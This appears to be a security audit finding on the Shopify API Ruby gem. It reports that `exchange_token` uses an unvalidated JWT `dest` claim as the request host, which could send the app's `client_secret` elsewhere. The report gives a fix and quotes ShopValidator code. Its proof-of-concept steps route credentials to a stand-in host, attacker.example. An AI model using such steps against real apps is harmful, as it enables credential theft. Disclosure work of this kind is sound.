Found it. `client_credentials.rb`, `refresh_token.rb`, and `migrate_to_expiring_token` in `token_exchange.rb` all call `Utils::ShopValidator.sanitize!(shop)` before building the `shop_session` used by `HttpClient` — but `exchange_token` in `token_exchange.rb` does not. It takes `dest_shop = jwt_payload.shop` straight from the JWT's `dest` claim and uses it, unvalidated, to build the session that `HttpClient` uses to derive the request host that receives the app's `client_id`/`client_secret`.

### Title
Unvalidated JWT `dest` claim used as request host leaks `client_secret` to attacker-controlled domain in Token Exchange - (`lib/shopify_api/auth/token_exchange.rb`)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the shop host from the session token's `dest` claim and uses it unsanitized to build the HTTP request that carries `client_id`/`client_secret` to `/admin/oauth/access_token`, unlike the sibling methods (`client_credentials`, `refresh_access_token`, `migrate_to_expiring_token`) which all call `Utils::ShopValidator.sanitize!` first.

### Finding Description
`JwtPayload#shop` simply strips `"https://"` from the `dest` claim with no domain allow‑list check: [1](#0-0) 

`exchange_token` uses that raw value directly to construct the `Session` passed to `HttpClient`, with no call to `Utils::ShopValidator.sanitize!`: [2](#0-1) 

`HttpClient#initialize` builds the outbound request base URI directly from `session.shop`: [3](#0-2) 

So the POST body containing `client_id` and `client_secret` is sent to `https://#{session.shop}/admin/oauth/access_token` — i.e., to whatever host is present in the JWT's `dest` claim.

Compare this to every other credential-exchange path in the same module family, which route the shop through the allow-list validator before it can influence the request host: [4](#0-3) [5](#0-4) [6](#0-5) 

`Utils::ShopValidator` exists precisely to bind "shop" values to the trusted Shopify domain set (`myshopify.com`, `myshopify.io`, `shopify.com`, `spin.dev`, `shop.dev`) before they're allowed to become a request host: [7](#0-6) 

The binding that should hold is: `host that receives client_secret == a Shopify-trusted domain`. In `exchange_token`, this becomes `host that receives client_secret == JwtPayload#dest (unchecked)`, breaking the intended equality. `JwtPayload` only verifies the JWT signature and `aud`; it never checks `iss`/`dest` against a trusted domain suffix: [8](#0-7) 

### Impact Explanation
This is SSRF carrying the app's credentials (`client_id` + `client_secret`): if a session token can be produced/relayed with a `dest` claim pointing at a non-Shopify host (e.g. a value the embedding surface or a malicious relaying party controls, since the only check is the HMAC signature over `aud`/`iss`/`dest`/etc., not that `dest` is a Shopify domain), the gem will POST the app's `client_secret` to that attacker-controlled host, allowing exfiltration of the client secret — a Critical-impact category per the rules.

### Likelihood Explanation
Requires the caller to obtain a validly-signed session token whose `dest` claim is not a genuine Shopify domain. Session tokens are normally issued only by Shopify with legitimate `dest` values, so exploitation in the standard embedded-app flow is constrained; however, the library provides no defense-in-depth check on `dest`/`iss` domain, unlike its own established pattern (`ShopValidator.sanitize!`) used everywhere else credentials are sent. This is a real gap relative to the gem's own security model, not merely a host-application misuse.

### Recommendation
In `exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `client_credentials`, and `refresh_access_token`. Additionally, consider having `JwtPayload` validate that `iss`/`dest` fall within `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` as part of decoding, so all consumers of `JwtPayload#shop` get this guarantee automatically.

### Proof of Concept
1. Obtain/produce a session token whose payload has `dest: "https://attacker.example"` (signed with the app's `api_secret_key`, e.g. via a component able to reflect/relay a token, or a testing/misconfiguration scenario where an untrusted secondary aud/dest is accepted).
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: :OFFLINE_ACCESS_TOKEN)`.
3. `JwtPayload#shop` returns `"attacker.example"` unchecked: [1](#0-0) 
4. `HttpClient` builds `@base_uri = "https://attacker.example"` and posts the body containing `client_id`/`client_secret` to `https://attacker.example/admin/oauth/access_token`: [3](#0-2) 
5. Contrast with `test/utils/shop_validator_test.rb`, which shows `sanitize!` rejects exactly such attacker-controlled domains — confirming the validator exists for this purpose but is skipped in `exchange_token`: [9](#0-8)

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
